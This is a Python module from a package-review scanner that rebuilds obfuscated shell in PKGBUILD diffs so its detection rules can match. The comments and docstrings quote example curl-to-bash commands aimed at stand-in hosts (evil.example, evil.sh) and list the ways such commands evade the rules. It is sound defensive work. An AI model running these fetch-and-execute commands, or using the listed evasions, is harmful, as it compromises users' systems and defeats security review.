import re
import shlex
import threading

# Expansion is bounded by *passes*, not by nesting depth: each pass
# rewrites one innermost ``${...}``, so a value that keeps producing new
# expansions runs out of passes rather than recursing.  There was also a
# ``_MAX_EXPANSION_DEPTH`` here; nothing referenced it, and a declared
# bound that is never applied is worse than no bound, because it reads
# like a guarantee.
_MAX_EXPANSION_PASSES = 16

# Innermost ${...} = one containing no further "${"
_INNERMOST_RE = re.compile(r"\$\{([^{}]*)\}")

# R117: obfuscated literal reconstruction forms.
#
# ANSI-C quoting: $'...' with \xHH hex or \NNN octal escapes.  The whole
# construction is reconstructed to its decoded bytes *as data*; nothing is
# ever executed.
_ANSI_C_QUOTE_RE = re.compile(r"\$'((?:\\.|[^'\\])*)'")

# A ``$'`` that is actually an ANSI-C quote *opener*: it starts a word.  A
# ``$`` immediately before a quote elsewhere - a regex end-anchor such as
# ``'/Windows/Fonts/.*\.tt[cf]$'`` or a literal ``QLatin1Char('$')`` - is
# not shell quoting, and reading one as an unreconstructable literal makes
# ordinary text look obfuscated.
_ANSI_C_OPENER_RE = re.compile(r"(?:^|[\s(=|&;{\"`])\$'")

# $(printf '...') with a single quoted literal format.  Only reconstructed
# when the format contains no %-conversion (which would need runtime
# arguments); anything dynamic stays as-is so the line is not silently
# treated as clean.
_PRINTF_LITERAL_RE = re.compile(
    r"\$\(\s*printf\s+(['\"])((?:\\.|[^'\"\\])*)\1\s*\)"
)

# Empty-quote concatenation: b''u''n / b""u""n -> bun.  An empty quote
# between two identifier characters is pure concatenation in shell and is
# dropped; a standalone '' argument (whitespace on both sides) is kept.
_EMPTY_QUOTE_CONCAT_RE = re.compile(r"(?<=\w)(?:''|\"\")(?=\w)")

# Partial (non-empty) quoting: c"u"rl -> curl, ba"sh" -> bash, "PA"TH= ->
# PATH=.  Shell removes quotes and concatenates the adjacent segments of one
# word, so ``c"u"rl`` is the single word ``curl``.  Quote-type nesting is
# respected: a ' inside double quotes is literal ("don't" keeps its
# apostrophe), a " inside single quotes is literal, and a backslash-escaped
# quote outside quotes stays escaped and opens nothing.
#
# A pair is stripped when removing it cannot change how the line reads as
# shell:
#
# - word-glued: a neighbour on at least one side continues the word (an
#   identifier or path character), and the content holds no whitespace and
#   no quote characters.  This is the non-empty twin of the empty-quote rule
#   above; both exist because ``c"u"rl`` reached no rule that names a
#   literal ``curl``.
# - standalone: the content is non-empty and free of whitespace, quotes and
#   the metacharacters that would become structure (a pipe, a redirection,
#   a comment opener) once unquoted.  ``"${arr[0]}"`` expands to a quoted
#   command word, and without this the pipe-to-shell rules still see no
#   literal shell after the ``|``.  A quoted string with spaces (a message,
#   ``'foo: a thing'`` in optdepends) or with structure inside (``'foo>=1'``
#   in a depends array) keeps its quotes, so tokenisation for the other
#   rules does not shift, and a standalone empty '' stays: it is an empty
#   argument, data rather than concatenation.
_WORD_ADJACENT = "A-Za-z0-9_./+:@~-"
_STRUCTURAL_METACHARS = "|&;<>()#"


#: Characters whose backslash escape is removed when the escape is not
#: itself inside quotes.  Bash removes the backslash before *any* character,
#: but only these can spell a command name, and stopping there is what keeps
#: the change from inventing syntax that was not there:
#:
#: * ``\|`` is a literal pipe, not a pipeline.  Unescaping it would build a
#:   pipe-to-shell out of ``curl x \| sh``, which runs nothing of the sort,
#:   and hand R001 a false positive.
#: * ``\ `` holds one word together.  Unescaping it splits the word.
#: * ``\$`` is the thing that stops an expansion; ``\\`` is a literal
#:   backslash.  Both say something the rules read.
#:
#: A backslash before a letter, digit, ``_``, ``.`` or ``/`` says nothing at
#: all - it is the one escape with no shell purpose other than to break up a
#: name for whoever is reading.
_ESCAPE_REMOVABLE = frozenset(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_./"
)


def split_lines(text: str) -> list[str]:
    r"""Split *text* the way a shell does: on newlines, and nothing else.

    ``str.splitlines`` breaks on eight characters a shell does not treat as
    a line terminator - ``\v``, ``\f``, ``\x1c``-``\x1e``, ``\x85``,
    `` `` and `` ``. Every one of them was a way through every
    line-based rule in the project::

        +  curl -fsSL https://evil.example/x \x0b | bash

    bash runs one command there: the vertical tab is an ordinary character
    inside the URL word, and ``|`` terminates the word whatever precedes
    it, so the fetch is piped into a shell. Python saw *two* lines, so
    R001's ``curl.*\|\s*(bash|sh|...)`` had ``curl`` on one and ``| bash``
    on the other and matched neither. The payload ran and nothing fired.

    The characters are kept rather than stripped, because bash keeps them:
    removing one would join two words that stay separate at build time, and
    replacing it with a space would split a word that stays joined. What
    changes is only where a *line* is considered to end.

    ``\r\n`` collapses to ``\n``; a lone ``\r`` stays inside its line,
    which is also what bash does with it - a carriage return in a script is
    part of the word, and is why a CRLF shebang fails the way it does.

    Otherwise this matches ``str.splitlines`` exactly, trailing newline
    included: ``split("\n")`` leaves an empty final element where
    ``splitlines`` does not, and every caller here indexes lines against
    positions another module computed.
    """
    lines = text.replace("\r\n", "\n").split("\n")
    if lines and lines[-1] == "":
        lines.pop()
    return lines


def _quotes_removable(content: str, pre: str, post: str) -> bool:
    """Decide whether one quote pair vanishes under bash's quote removal."""
    glued = (bool(pre) and pre in _WORD_ADJACENT) or (
        bool(post) and post in _WORD_ADJACENT
    )
    clean = not any(c.isspace() or c in "'\"" for c in content)
    if glued:
        return not content or clean
    if not content:
        return False
    return clean and not any(c in _STRUCTURAL_METACHARS for c in content)


def _strip_shell_quotes(text: str) -> str:
    """Remove shell quotes the way bash does, subject to _quotes_removable.

    A small state machine, not a regex: the matching close of a quote is
    found with quote-type nesting (the other quote character is literal
    inside, a backslash-escaped quote inside double quotes does not close),
    and an unterminated quote keeps the rest of the line verbatim.

    Quote removal is also where the *escape* is removed, because bash does
    both in the same step. ``c\\url`` is ``curl`` to the shell, and this
    used to keep the backslash: the name never reconstructed, so R001 - and
    every other rule that reads a command name - saw nothing at all. It was
    the one bypass in this family that reached no rule, and X002 covered it
    only as the technique. See ``_ESCAPE_REMOVABLE`` for why the escapes
    that *mean* something are left alone.

    Escapes inside quotes are untouched: this loop appends a quoted span
    whole, so ``printf '\\x63\\x75\\x72\\x6c'`` keeps its escapes for
    ``reconstruct_literals`` to decode, and a single-quoted backslash is
    literal in bash anyway.
    """
    out: list[str] = []
    i = 0
    n = len(text)
    while i < n:
        c = text[i]
        if c == "\\" and i + 1 < n:
            # An escaped character is not a quote opener, whatever it is.
            nxt = text[i + 1]
            out.append(nxt if nxt in _ESCAPE_REMOVABLE else text[i : i + 2])
            i += 2
            continue
        if c not in "'\"":
            out.append(c)
            i += 1
            continue
        q = c
        j = i + 1
        while j < n:
            d = text[j]
            if q == '"' and d == "\\" and j + 1 < n:
                j += 2
                continue
            if d == q:
                break
            j += 1
        if j >= n:
            out.append(text[i:])
            break
        content = text[i + 1 : j]
        pre = text[i - 1] if i > 0 else ""
        post = text[j + 1] if j + 1 < n else ""
        if _quotes_removable(content, pre, post):
            out.append(content)
        else:
            out.append(text[i : j + 1])
        i = j + 1
    return "".join(out)

_ANSI_C_ESCAPES = {
    "n": "\n", "t": "\t", "r": "\r", "a": "\a", "b": "\b",
    "f": "\f", "v": "\v", "e": "\x1b", "\\": "\\", "'": "'",
    '"': '"',
}


def _decode_ansi_c(body: str) -> str:
    """Decode the escapes in an ANSI-C quoted string, data only."""
    out: list[str] = []
    i = 0
    while i < len(body):
        c = body[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= len(body):
            break
        e = body[i]
        if e == "x":
            j = i + 1
            hexs = ""
            while j < len(body) and j < i + 3 and body[j] in "0123456789abcdefABCDEF":
                hexs += body[j]
                j += 1
            if hexs:
                out.append(chr(int(hexs, 16)))
                i = j
            else:
                out.append("\\x")
                i += 1
        elif e in "01234567":
            j = i
            octs = ""
            while j < len(body) and j < i + 3 and body[j] in "01234567":
                octs += body[j]
                j += 1
            out.append(chr(int(octs, 8)))
            i = j
        elif e in _ANSI_C_ESCAPES:
            out.append(_ANSI_C_ESCAPES[e])
            i += 1
        else:
            out.append(e)
            i += 1
    return "".join(out)


def reconstruct_literals(text: str) -> tuple[str, bool]:
    """Reconstruct obfuscated shell literals back to plain text.

    Handles the four R117 forms, all *as data* (nothing is executed):

    - ANSI-C quoting:      ``$'\\x62\\x75\\x6e'`` -> ``bun``
    - ANSI-C octal:        ``$'\\142\\165\\156'`` -> ``bun``
    - Empty-quote concat:  ``b''u''n`` / ``b""u""n`` -> ``bun``
    - printf literal:      ``$(printf '\\x62\\x75\\x6e')`` -> ``bun``

    Returns ``(reconstructed, fully_reconstructed)``.  ``fully_reconstructed``
    is False when an ANSI-C quote could not be decoded (a malformed ``$'``
    remains), so the caller marks the line inconclusive rather than silently
    clean.  A ``$(printf '%s' "$arg")``-style call is left untouched but does
    not by itself force the line to be inconclusive: it is dynamic content,
    not an obfuscation marker.
    """
    result = _ANSI_C_QUOTE_RE.sub(lambda m: _decode_ansi_c(m.group(1)), text)

    def _printf_sub(match: re.Match) -> str:
        fmt = match.group(2)
        if "%" in fmt or fmt == "":
            return match.group(0)
        return _decode_ansi_c(fmt)

    result = _PRINTF_LITERAL_RE.sub(_printf_sub, result)
    result = _EMPTY_QUOTE_CONCAT_RE.sub("", result)
    # After ANSI-C opener detection has run below, so a genuine ``$'`` is
    # still counted as unreconstructed; intra-word quote stripping only
    # removes ordinary pairs.
    unreconstructed = bool(_ANSI_C_OPENER_RE.search(result))
    result = _strip_shell_quotes(result)
    return result, not unreconstructed


def _glob_to_regex(pat: str) -> re.Pattern:
    """Translate a bash glob pattern to a regex.  Bash character classes
    and metacharacters are translated; everything else is escaped so that
    dots, hyphens, etc. are literals rather than regex operators."""
    out: list[str] = []
    i = 0
    while i < len(pat):
        c = pat[i]
        if c == "*":
            out.append(".*")
        elif c == "?":
            out.append(".")
        elif c == "[":
            j = pat.find("]", i + 1)
            if j == -1:
                out.append(re.escape(c))
            else:
                cls = pat[i + 1 : j]
                if cls.startswith("!"):
                    cls = "^" + cls[1:]
                out.append("[" + cls + "]")
                i = j
        else:
            out.append(re.escape(c))
        i += 1
    return re.compile("".join(out))


def _strip_affix(val: str, op: str, pat: str) -> str:
    """Apply bash ## / # / %% / % stripping using glob patterns."""
    regex = _glob_to_regex(pat)
    if op == "##":
        m = regex.search(val)
        return val[m.end() :] if m else val
    if op == "#":
        m = regex.match(val)
        return val[m.end() :] if m else val
    if op == "%%":
        # find the LAST match of the glob
        matches = list(regex.finditer(val))
        if not matches:
            return val
        return val[: matches[-1].start()]
    if op == "%":
        m = regex.search(val)
        if not m:
            return val
        return val[: m.start()]
    return val


def _expand_one(
    body: str,
    vars_: dict[str, str],
    arrays: dict[str, list[str]] | None = None,
) -> str | None:
    """Resolve a single innermost ${...} body.

    *body* is the content between ${ and }; all nested expansions have
    already been resolved at this point, so no further ${...} remains.

    Returns None (unresolved) for forms we refuse to evaluate.
    """
    arrays = arrays or {}

    # Indirect expansion and length: never resolve.
    if body.startswith("!") or body.startswith("#"):
        return None

    # Array element or whole-array expansion.
    m = re.match(r"^(\w+)\[(\*|@|\d+)\]$", body)
    if m:
        name, idx = m.group(1), m.group(2)
        arr = arrays.get(name)
        if arr is None:
            return None
        if idx in ("*", "@"):
            return " ".join(arr)
        i = int(idx)
        return arr[i] if 0 <= i < len(arr) else ""

    # //pat/rep  |  //pat  (delete)  |  /pat/rep
    m = re.match(r"^(\w+)(//|/)([^/]*)(?:/(.*))?$", body)
    if m:
        name, mode, pat, rep = m.group(1), m.group(2), m.group(3), m.group(4) or ""
        val = vars_.get(name)
        if val is None:
            # Bash treats an unset scalar in ${var/pat/rep} as empty.
            return ""
        regex = _glob_to_regex(pat)
        if mode == "//":
            return regex.sub(rep, val)
        return regex.sub(rep, val, count=1)

    # ##pat  #pat  %%pat  %pat
    m = re.match(r"^(\w+)(##|#|%%|%)(.*)$", body)
    if m:
        name, op, pat = m.group(1), m.group(2), m.group(3)
        val = vars_.get(name)
        if val is None:
            return ""
        return _strip_affix(val, op, pat)

    # :-default  /  :=default
    m = re.match(r"^(\w+):([-=])(.*)$", body)
    if m:
        name, _, default = m.group(1), m.group(2), m.group(3)
        return vars_.get(name) or default

    # :offset:length  /  :offset
    m = re.match(r"^(\w+):(\d+)(?::(\d+))?$", body)
    if m:
        name, off, length = m.group(1), m.group(2), m.group(3)
        val = vars_.get(name)
        if val is None:
            return ""
        return val[int(off) : int(off) + int(length)] if length else val[int(off) :]

    # plain variable reference
    if re.fullmatch(r"\w+", body):
        if body in arrays:
            arr = arrays[body]
            return arr[0] if arr else ""
        return vars_.get(body)

    return None


def resolve_expansions(
    text: str,
    vars_: dict[str, str],
    arrays: dict[str, list[str]] | None = None,
) -> tuple[str, bool]:
    """Resolve nested ${...} parameter expansions innermost-first.

    Returns (resolved_text, fully_resolved).
    fully_resolved is False if any ${...} remains after the cap; the caller
    MUST treat that as unresolved, never as a literal value.
    """
    arrays = arrays or {}
    all_resolved = True
    for _ in range(_MAX_EXPANSION_PASSES):
        before = text
        m = _INNERMOST_RE.search(text)
        if m is None:
            return text, all_resolved and "${" not in text
        replacement = _expand_one(m.group(1), vars_, arrays)
        if replacement is None:
            all_resolved = False
        else:
            text = text[: m.start()] + replacement + text[m.end() :]
        if text == before:
            return text, all_resolved and "${" not in text
    return text, False


def _substitute_with_resolve(
    text: str,
    var_table: dict[str, str],
    array_table: dict[str, list[str]] | None = None,
) -> tuple[str, bool]:
    """Resolve $var, ${var...} and ${arr[i]} references in *text*, returning
    (resolved, fully_resolved).  R117 literal reconstruction runs on the
    resolved line, so obfuscated forms reach rules in their plain-text
    shape while the line is marked unresolved when reconstruction fails."""
    array_table = array_table or {}

    def replacer(match: re.Match) -> str:
        var = match.group(1) or match.group(2)
        if var in array_table:
            arr = array_table[var]
            return arr[0] if arr else match.group(0)
        return var_table.get(var, match.group(0))

    # First resolve simple ${var} and $var.
    resolved = _VAR_REF_RE.sub(replacer, text)
    if len(resolved) > _MAX_LINE_LEN:
        return text, False
    # Then resolve parameter expansions (${var//pat/rep}, ${arr[i]}, etc.).
    ok = True
    if "${" in resolved:
        resolved, ok = resolve_expansions(resolved, var_table, array_table)
        if len(resolved) > _MAX_LINE_LEN:
            return text, False
    # R117: reconstruct obfuscated literals as data, never executed.
    reconstructed, fully = reconstruct_literals(resolved)
    if len(reconstructed) > _MAX_LINE_LEN:
        return text, False
    # Partial expansion is kept: a resolved ${arr[0]} -> curl still helps
    # rules see the downloader even when ${url} on the same line is unknown.
    return reconstructed, ok and fully


# Twenty call sites in analysis/ ask for the resolved form of the *same*
# diff, once each, and it used to be recomputed every time: 8000 calls for
# 400 diffs, about a third of the analysis cost.  The function is pure, so
# the result is memoised per thread.
#
# Keyed on identity, not equality: a diff can be megabytes, and hashing it
# twenty times to avoid computing it twenty times is not a saving.  Every
# caller inside one analysis is handed the same object, so identity hits.
# Two entries, because the pipeline holds both the raw diff and its
# clamped form (rules.clamp_text) and alternates between them.
#
# Thread-local because `review` analyses packages in a pool; a shared cache
# would need a lock on the hot path and would give one package's lines to
# another on an identity collision after a free.
_memo = threading.local()
_MEMO_ENTRIES = 2


def _memoised(kind: str, key: str, compute):
    """Return ``compute()`` for *key*, reusing a recent identical object."""
    store = getattr(_memo, kind, None)
    if store is None:
        store = _memo.__dict__.setdefault(kind, [])
    for cached_key, cached_value in store:
        if cached_key is key:
            # A copy: callers receive a plain list they may treat as their
            # own, and a shared one would turn any future in-place edit
            # into a bug in an unrelated rule.
            return list(cached_value)
    value = compute()
    store.append((key, value))
    del store[:-_MEMO_ENTRIES]
    return list(value)


def join_line_continuations(lines: list[str]) -> list[str]:
    """Join shell line continuations into single logical lines.

    Rules are matched one line at a time, so a command split with a
    trailing backslash slips past any pattern that has to see the whole
    pipeline::

        curl \\
          http://evil.sh | bash

    Without this, the CRITICAL "pipe to shell" rules see only ``curl \\``
    and the payload arrives as an unrelated fragment.  Only lines
    carrying the same diff marker are joined, so an addition is never
    spliced onto a removal.
    """
    out: list[str] = []
    # Accumulated as parts and joined once.  Appending to a string per
    # continuation line made this quadratic, so a diff of many backslash
    # continuations (which an untrusted PKGBUILD controls) cost time
    # proportional to the square of its length.
    parts: list[str] | None = None
    marker = ""

    def flush() -> str:
        return "".join(parts)

    for line in lines:
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        body = line[1:] if this_marker else line
        if parts is not None and this_marker == marker:
            # Verbatim, with no separator inserted.  A backslash-newline is
            # *removed* by the shell, it is not whitespace: `cur\` + `l ...`
            # is `curl ...`, and joining with a space produced `cur l ...`,
            # which splits a command name into two words and defeats every
            # rule that matches it. Indentation on the continuation line
            # still separates arguments, because it is kept as written.
            parts.append(body)
        else:
            if parts is not None:
                out.append(marker + flush())
            parts, marker = [body], this_marker
        tail = parts[-1]
        if tail.rstrip().endswith("\\"):
            parts[-1] = tail.rstrip()[:-1].rstrip()
        else:
            out.append(marker + flush())
            parts, marker = None, ""
    if parts is not None:
        out.append(marker + flush())
    return out


# Assignments are frequently indented (every one inside a function body
# is) and may be introduced by a declaration keyword.  Anchoring on the
# bare name meant the variable table stayed empty for function bodies,
# so `C=curl; $C evil | bash` never resolved and defeated every rule
# that matches resolved strings.
# Group 2 is the operator: ``=`` is a fresh binding, ``+=`` appends to the
# current value.  Splitting a downloader across a chain of ``C+=curl`` /
# ``C+=' https://...'`` lines kept no literal ``curl ... | bash`` on any one
# line, so the assignment resolver never rebuilt the command and R001 never
# saw it.  Accumulating += closes that gap; the value group moved from 2 to 3.
_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*(\+?=)\s*(.+)"
)

# Array assignment opener: ``_c=(curl -fsSL)`` or ``source=(`` spanning
# several lines.  Captured group 3 is the text after ``(``.
_ARRAY_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*(\+?=)\s*\((.*)"
)


# Simple variable references.  A braced reference that is immediately
# followed by ``[`` is an array subscript and is handled by
# :func:`resolve_expansions` instead, so the ``[`` stays outside this match.
_VAR_REF_RE = re.compile(r"\$\{(\w+)\}(?!\[)|\$(\w+)")


# Substitution is iterated, and each round can double a value that refers
# to itself twice (``b=$a$a``).  A chain of such assignments expands as
# 2**depth, so a 517-byte PKGBUILD was enough to exhaust a gigabyte and
# have the process OOM-killed.  Since the input is by definition an
# untrusted package, expansion is bounded on three axes: how large one
# value may grow, how large a single resolved line may grow, and how much
# the table may hold in total.  A value that would exceed its bound is
# left unexpanded rather than truncated: an unresolved "$payload" is
# reported as an unresolved pattern, whereas a truncated one would look
# like a fully resolved string with its tail silently removed.
_MAX_VALUE_LEN = 8192
_MAX_LINE_LEN = 65536
_MAX_TABLE_BYTES = 1 << 20


def _strip_outer_quotes(value: str) -> str:
    """Remove one matching pair of surrounding quotes, if present."""
    if (value.startswith('"') and value.endswith('"')) or (
        value.startswith("'") and value.endswith("'")
    ):
        return value[1:-1]
    return value


def _collect_array_entries(additions: list[str], start_idx: int) -> tuple[int, list[str]]:
    """Collect the entries of a ``name=( ...)`` array starting at *start_idx*.

    Returns the index of the line that closed the array and the list of
    entries (outer quotes removed by ``shlex``).  Nested parentheses inside
    quotes are ignored; the closing ``)`` that balances the opener is not
    included in the parsed content.
    """
    first = additions[start_idx]
    m = _ARRAY_ASSIGNMENT_RE.match(first)
    if not m:
        return start_idx, []
    # *rest* is the text after the opening ``(`` on the first line; the
    # opener itself is represented by the initial depth of 1.
    rest = m.group(3)
    depth = 1
    in_single = in_double = False
    parts: list[str] = []
    i = start_idx
    for line in [rest] + additions[start_idx + 1 :]:
        content: list[str] = []
        j = 0
        while j < len(line):
            ch = line[j]
            if in_double:
                if ch == "\\" and j + 1 < len(line):
                    content.append(ch)
                    content.append(line[j + 1])
                    j += 2
                    continue
                if ch == '"':
                    in_double = False
                content.append(ch)
                j += 1
                continue
            if in_single:
                if ch == "'":
                    in_single = False
                content.append(ch)
                j += 1
                continue
            if ch == '"':
                in_double = True
                content.append(ch)
                j += 1
                continue
            if ch == "'":
                in_single = True
                content.append(ch)
                j += 1
                continue
            if ch == '(':
                depth += 1
                content.append(ch)
                j += 1
                continue
            if ch == ')':
                depth -= 1
                if depth == 0:
                    break
                content.append(ch)
                j += 1
                continue
            content.append(ch)
            j += 1
        parts.append("".join(content))
        if depth == 0:
            break
        i += 1
    try:
        entries = [e for e in shlex.split(" ".join(parts)) if e]
    except ValueError:
        entries = []
    return i, entries


def _substitute(
    text: str,
    var_table: dict[str, str],
    array_table: dict[str, list[str]] | None = None,
    limit: int = _MAX_LINE_LEN,
) -> str:
    """Resolve variable and array references in *text*."""
    array_table = array_table or {}

    def replacer(match: re.Match) -> str:
        var = match.group(1) or match.group(2)
        if var in array_table:
            arr = array_table[var]
            return arr[0] if arr else match.group(0)
        return var_table.get(var, match.group(0))

    result = _VAR_REF_RE.sub(replacer, text)
    if len(result) > limit:
        return text
    if "${" in result:
        result, _ok = resolve_expansions(result, var_table, array_table)
        if len(result) > limit:
            return text
    reconstructed, _fully = reconstruct_literals(result)
    return reconstructed if len(reconstructed) <= limit else text


def _variable_table(
    additions: list[str],
) -> tuple[dict[str, str], dict[str, list[str]]]:
    """Resolve assignments among added lines into scalar and array tables."""
    var_table: dict[str, str] = {}
    array_table: dict[str, list[str]] = {}
    i = 0
    while i < len(additions):
        line = additions[i]
        # Arrays first: ``source=(... )`` may span multiple added lines.
        arr_match = _ARRAY_ASSIGNMENT_RE.match(line)
        if arr_match:
            name, op = arr_match.group(1), arr_match.group(2)
            close_idx, entries = _collect_array_entries(additions, i)
            if entries:
                if op == "+=":
                    array_table.setdefault(name, []).extend(entries)
                else:
                    array_table[name] = entries
            i = close_idx + 1
            continue
        scalar_match = _ASSIGNMENT_RE.match(line)
        if scalar_match:
            name, op, value = (
                scalar_match.group(1),
                scalar_match.group(2),
                scalar_match.group(3).strip(),
            )
            value = _strip_outer_quotes(value)
            # A command substitution has no static value, so it cannot be
            # folded into the table.
            if "$(" not in value and "`" not in value:
                if op == "+=":
                    var_table[name] = var_table.get(name, "") + value
                else:
                    var_table[name] = value
        i += 1

    for _ in range(10):
        new_table: dict[str, str] = {}
        for k, v in var_table.items():
            substituted, _ = _substitute_with_resolve(v, var_table, array_table)
            new_table[k] = substituted if len(substituted) <= _MAX_VALUE_LEN else v
        if new_table == var_table:
            break
        var_table = new_table
        if sum(len(v) for v in var_table.values()) > _MAX_TABLE_BYTES:
            break
    return var_table, array_table


def resolve_added_lines(diff_text: str) -> list[str]:
    """Diff lines with each added line replaced by its resolved form.

    Order and count are preserved, so callers can still map a line back to
    its enclosing function via
    :func:`~trustsight.rules._classify_enclosing_function`.  Rules scoped to
    ``build()`` or ``pkgver()`` need that positional information.

    Substitution is applied per line rather than by zipping against
    :func:`tokenize_and_resolve`, whose output omits assignment lines: any
    added assignment made the two sequences different lengths and shifted
    every following line onto the wrong position.
    """
    return _memoised("resolved", diff_text, lambda: _resolve_added_lines(diff_text))


def _resolve_added_lines(diff_text: str) -> list[str]:
    lines = join_line_continuations(split_lines(diff_text))
    var_table, array_table = _variable_table(
        [ln[1:] for ln in lines if ln.startswith("+") and ln[1:].strip()]
    )
    resolved_lines = []
    for line in lines:
        if line.startswith("+"):
            r, _ok = _substitute_with_resolve(line[1:], var_table, array_table)
            resolved_lines.append("+" + r)
        else:
            resolved_lines.append(line)
    return resolved_lines


def _joined_indexed(lines: list[str]) -> list[tuple[int, str]]:
    """Like :func:`join_line_continuations`, but each logical line is
    paired with the index of the first raw line that produced it.

    ``apply_rules`` needs that index to attach a file/line: the resolved
    candidate list omits assignment lines, so its own positions are not
    the keys of :func:`~trustsight.differ.map_diff_lines`, which are raw
    diff-line indexes.
    """
    out: list[tuple[int, str]] = []
    parts: list[str] | None = None
    marker = ""
    start_index = -1

    def flush() -> str:
        return "".join(parts)

    for i, line in enumerate(lines):
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        body = line[1:] if this_marker else line
        if parts is not None and this_marker == marker:
            # Verbatim, exactly as `join_line_continuations` does: a
            # backslash-newline is removed by the shell rather than being
            # whitespace. These two joiners must agree, or the rule path and
            # the coverage path read different text from the same diff.
            parts.append(body)
        else:
            if parts is not None:
                out.append((start_index, marker + flush()))
            parts, marker, start_index = [body], this_marker, i
        tail = parts[-1]
        if tail.rstrip().endswith("\\"):
            parts[-1] = tail.rstrip()[:-1].rstrip()
        else:
            out.append((start_index, marker + flush()))
            parts, marker, start_index = None, "", -1
    if parts is not None:
        out.append((start_index, marker + flush()))
    return out


def tokenize_and_resolve_indexed(
    diff_text: str,
) -> tuple[list[str], list[str], list[int]]:
    """Tokenize a diff, resolve variable references in added lines, and
    record the raw diff-line index of each resolved string.

    The third list parallels ``resolved``: ``resolved[i]`` came from the
    line at ``split_lines(diff_text)[indices[i]]``.  ``map_diff_lines`` is
    keyed on those raw indexes, so a caller can attach a correct
    file/line to every resolved-rule finding.
    """
    joined = _joined_indexed(split_lines(diff_text))
    additions = []
    addition_indices = []
    for raw_index, line in joined:
        if line.startswith("+"):
            content = line[1:]
            if content.strip():
                additions.append(content)
                addition_indices.append(raw_index)

    var_table, array_table = _variable_table(additions)

    # An assignment whose value is statically known contributes its value
    # to the table rather than a command line to match against; anything
    # else is a candidate for resolution.
    candidates = [
        (addition_indices[k], line)
        for k, line in enumerate(additions)
        if not (
            (m := _ASSIGNMENT_RE.match(line))
            and "$(" not in m.group(3)
            and "`" not in m.group(3)
        )
    ]

    resolved = []
    unresolved_out = []
    for _raw_index, line in candidates:
        r, ok = _substitute_with_resolve(line, var_table, array_table)
        resolved.append(r)
        if not ok or r == line:
            unresolved_out.append(line)
    candidate_indices = [raw_index for raw_index, _line in candidates]
    return resolved, unresolved_out, candidate_indices


def tokenize_and_resolve(diff_text: str) -> tuple[list[str], list[str]]:
    """Tokenize a diff and resolve variable references in added lines."""
    resolved, unresolved_out, _ = tokenize_and_resolve_indexed(diff_text)
    return resolved, unresolved_out